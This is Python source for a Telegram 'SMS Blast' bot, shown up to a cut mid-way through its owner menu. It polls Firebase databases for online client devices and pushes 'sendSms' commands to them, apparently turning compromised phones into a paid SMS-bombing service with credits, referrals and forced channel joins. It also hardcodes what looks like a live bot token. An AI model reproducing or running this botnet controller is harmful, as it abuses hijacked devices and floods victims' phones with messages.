#🗿 Bot Developer - @deathalive07
#🔰 Developer Channel - @trusteddealers07

import asyncio, json, os, time, logging, random, string
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(text=label, callback_data=callback_data, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, callback_data=callback_data)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, url=url)

MAIN_OWNER = 8646237754
SUPER_ADMIN_NAME = "@deathalive07"
SUPER_ADMIN_LINK = "https://t.me/deathalive07"
SUPER_ADMINS = [8646237754]

BOT_TOKEN = "8961489153:AAHxvKlWUKXd8xxp0M06CkwEAv2MosQOOnc"
LOG_CHANNEL_ID = -1003799923110

_DATA_FILE = "blast_data.json"
_VERSION = "v3.2-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

# ===== FORCE JOIN CHANNELS =====
# ⚠️ REPLACE these "id" values with REAL numeric chat IDs (-100...) after adding bot as admin.
# Links stay as given by Dotbhai; check_membership uses the numeric id.
FORCE_JOIN_CHANNELS = [
    {"id": -1000000000001, "link": "https://t.me/trustmebaby07", "title": "Trust Me Baby", "required": True},
    {"id": -1000000000002, "link": "https://t.me/trusteddealers_07", "title": "Trusted Dealers", "required": True},
    {"id": -1000000000003, "link": "https://t.me/trusteddealers07", "title": "Trusted Dealers 07", "required": True},
]

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number']
    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": True, "channels": [dict(c) for c in FORCE_JOIN_CHANNELS]},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": []
    }

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            fj = data.setdefault("force_join", {})
            if not fj.get("channels"):
                fj["channels"] = [dict(c) for c in FORCE_JOIN_CHANNELS]
                fj["enabled"] = True
            for uid_str, u in data.get("users", {}).items():
                u.setdefault("credits", 0)
                u.setdefault("sms_history", [])
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    with open(_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d): return False
    if is_admin(uid, d): return True
    if d.get("free_mode"): return True
    if uid in d.get("approved", []): return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    d.setdefault("users", {}).setdefault(k, {"credits": 0})
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        cur = d["users"][k].get("credits", 0)
        if cur >= amount:
            d["users"][k]["credits"] = cur - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if not any(u.get("refer_code") == code for u in d.get("users", {}).values()):
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str); break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    rc = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, rc, d)
    add_credits(referrer_uid, rc, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴀᴀᴘᴋᴏ {rc} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        try:
            await bot.send_video(chat_id, video=random.choice(videos), caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row] for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4: return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    dc = len(CACHED_DEVICES)
    td = time.time() - LAST_SCAN_TIME
    if td < 60: return f"{em(EMOJI_CHECK, '🟢')} {dc} ᴅᴇᴠɪᴄᴇs"
    if td < 300: return f"{em(EMOJI_WARNING, '🟡')} {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ ᴏʟᴅ)"
    return f"{em(EMOJI_CROSS, '🔴')} {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ ᴏʟᴅ)"

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300: return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"), device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs: return []
    results = []
    cur_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") in cur_ids]
    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200: return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt: return
                    ids = json.loads(txt)
                    if not isinstance(ids, dict): return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        t2 = (await r2.text()).strip()
                                        if t2 == "null" or not t2: return None
                                        dd = json.loads(t2)
                                        if isinstance(dd, dict) and device_is_online(dd):
                                            name = dd.get("deviceName") or dd.get("name") or dev_id[:16]
                                            return {
                                                "fb_id": fb["id"], "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id, "dev_name": name,
                                                "sims": dd.get("sims", []),
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    id_list = list(ids.keys())
                    for i in range(0, len(id_list), 20):
                        batch = id_list[i:i+20]
                        for res in await asyncio.gather(*[fetch_dev(x) for x in batch]):
                            if res: results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {"from": sim_slot, "to": to.strip(), "message": message.strip(),
         "isSended": False, "timestamp": int(time.time())}
    )

async def check_membership(bot: Bot, uid: int, channel_id) -> bool:
    try:
        cid = int(str(channel_id).strip())
        m = await bot.get_chat_member(cid, uid)
        return m.status in ("member", "administrator", "creator")
    except Exception as e:
        log.warning(f"Force Join check failed for {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d): return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False): return True, []
    missing = []
    for ch in fj.get("channels", []):
        if ch.get("required", True) and not await check_membership(bot, uid, ch["id"]):
            missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = [[btn_url(f"ᴊᴏɪɴ {ch.get('title','Channel')}", ch["link"], EMOJI_BELL, "🔔")] for ch in missing]
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60: return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS
    log.info("Background Firebase Scanner STARTED")
    first = False
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5); continue
            SCANNING_IN_PROGRESS = True
        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
        start = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs"
                CACHED_DEVICES = []
            else:
                devices = await get_all_online_devices(d)
                dur = time.time() - start
                CACHED_DEVICES = devices
                for fb in fbs:
                    FB_DEVICE_COUNTS[fb["id"]] = {
                        "label": fb.get("label", fb["url"][:30]),
                        "online": sum(1 for dv in devices if dv["fb_id"] == fb["id"]),
                        "last_update": int(time.time())
                    }
                LAST_SCAN_TIME = time.time()
                if devices:
                    SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs | {fmt_time(int(time.time()))}"
                    if not first:
                        try:
                            await bot.send_message(
                                MAIN_OWNER,
                                f"{em(EMOJI_ROCKET, '🚀')} <b>Scanner active</b>\n"
                                f"{em(EMOJI_PHONE, '📱')} Devices: <b>{len(devices)}</b>\n"
                                f"{em(EMOJI_FIRE, '🔥')} DBs: <b>{len(fbs)}</b>\n"
                                f"{em(EMOJI_WARNING, '⏱')} Scan: <b>{dur:.1f}s</b>",
                                parse_mode="HTML"
                            )
                        except Exception as e:
                            log.warning(f"Owner notify failed: {e}")
                        first = True
                else:
                    SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs | {fmt_time(int(time.time()))}"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", []); owners = d.get("owners", [])
    admins = d.get("admins", []); users = d.get("users", {})
    stats = d.get("stats", {}); videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK,'🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS,'🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    fj = d.get("force_join", {})
    fj_st = f"{em(EMOJI_CHECK,'🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS,'🔴')} ᴏғғ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    fb_lines = []
    for fid, fd in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fd.get("last_update", 0))
        st = em(EMOJI_CHECK,"🟢") if age<60 else em(EMOJI_WARNING,"🟡") if age<300 else em(EMOJI_CROSS,"🔴")
        fb_lines.append(f"  {st} {fd['label'][:20]}: {fd['online']} ᴏɴʟɪɴᴇ")
    fb_sum = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING,'😴')} ɴᴏ ᴅᴀᴛᴀ"
    return (
        f"{em(EMOJI_CROWN,'👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ {_VERSION}\n"
        f"<b>Dev:</b> {SUPER_ADMIN_NAME}\n\n━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE,'🔥')} DBs         : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN,'👑')} Super Admins: <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD,'🛡')} Admins      : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR,'👥')} Users       : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO,'📹')} Videos      : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK,'📤')} Sent        : <b>{stats.get('total_sent',0)}</b>\n"
        f"{em(EMOJI_CROSS,'❌')} Failed      : <b>{stats.get('total_failed',0)}</b>\n"
        f"{em(EMOJI_ROCKET,'🚀')} Active Sends: <b>{active}</b>\n"
        f"{em(EMOJI_GIFT,'🔓')} Access Mode : {mode}\n"
        f"{em(EMOJI_BELL,'📢')} Force Join  : {fj_st}\n"
        f"{em(EMOJI_MONEY,'💳')} Plans       : <b>{len(d.get('pricing',{}).get('plans',[]))}</b>\n"
        f"{em(EMOJI_LOCK,'🔒')} Protected   : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE,'📱')} Per DB:\n{fb_sum}\n"
        f"{em(EMOJI_GEAR,'🔄')} Scanner     : {get_scan_status()}\n━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {}); stats = d.get("stats", {})
    banned = d.get("banned", []); videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK,'🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS,'🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    return (
        f"{em(EMOJI_SHIELD,'🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ {_VERSION}\n\n━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR,'👥')} Users       : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO,'📹')} Videos      : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CROSS,'🚫')} Banned      : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK,'📤')} Sent        : <b>{stats.get('total_sent',0)}</b>\n"
        f"{em(EMOJI_CROSS,'❌')} Failed      : <b>{stats.get('total_failed',0)}</b>\n"
        f"{em(EMOJI_ROCKET,'🚀')} Active Sends: <b>{active}</b>\n"
        f"{em(EMOJI_FIRE,'🔥')} DBs         : <b>{len(d.get('firebases',[]))}</b>\n"
        f"{em(EMOJI_LOCK,'🔒')} Protected   : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_GIFT,'🔓')} Access Mode : {mode}\n"
        f"{em(EMOJI_GEAR,'🔄')} Scanner     : {get_scan_status()}\n━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    return (
        f"{em(EMOJI_PHONE,'📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Dev:</b> {SUPER_ADMIN_NAME}\n\n"
        f"{em(EMOJI_STAR,'👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY,'💰')} ᴄʀᴇᴅɪᴛs : <b>{udata.get('credits',0)}</b>\n"
        f"{em(EMOJI_STAR,'🔢')} ᴜsᴇs    : <b>{udata.get('uses',0)}</b>\n"
        f"{em(EMOJI_FIRE,'🔥')} ᴀᴘɪs    : <b>{len(d.get('firebases',[]))}</b>\n"
        f"{em(EMOJI_GEAR,'🔄')} sᴄᴀɴɴᴇʀ : {get_scan_status()}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET,'🚀')}"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = ("🔴 " + sc("disable free mode"), "owner:free:off") if d.get("free_mode") else ("🟢 " + sc("enable free mode"), "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu", EMOJI_FIRE, "🔥")],
        [btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹"), btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"), btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛʏ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜"), btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋")],
